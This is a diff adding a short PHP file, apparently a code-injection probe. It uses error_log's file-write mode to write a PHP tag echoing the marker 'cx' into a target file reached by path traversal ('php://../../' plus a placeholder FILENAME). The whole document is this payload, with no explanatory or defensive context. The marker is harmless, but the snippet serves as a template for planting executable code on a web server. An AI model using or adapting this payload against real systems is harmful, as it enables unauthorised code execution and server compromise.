@@ -1,0 +1,5 @@
+&lt;?php
+$file=&quot;&quot;; # FILENAME
+error_log(&quot;&lt;? echo \&quot;cx\&quot;; ?&gt;&quot;, 3, &quot;php://../../&quot;.$file);
+?&gt;
+
